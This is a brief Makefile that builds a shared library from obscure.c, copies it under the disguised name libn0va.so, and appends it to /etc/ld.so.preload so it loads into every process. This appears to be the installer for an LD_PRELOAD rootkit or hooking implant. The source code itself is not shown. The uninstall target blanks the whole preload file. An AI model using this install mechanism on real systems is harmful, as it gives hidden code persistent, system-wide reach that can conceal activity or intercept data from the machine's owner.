all: obscure.so

obscure.so: obscure.c
	gcc -Wall -fPIC -shared -o obscure.so obscure.c -ldl

install:
	cp obscure.so /usr/local/lib/libn0va.so
	echo /usr/local/lib/libn0va.so >> /etc/ld.so.preload

uninstall:
	echo "" > /etc/ld.so.preload

.PHONY clean:
	rm -f *.so
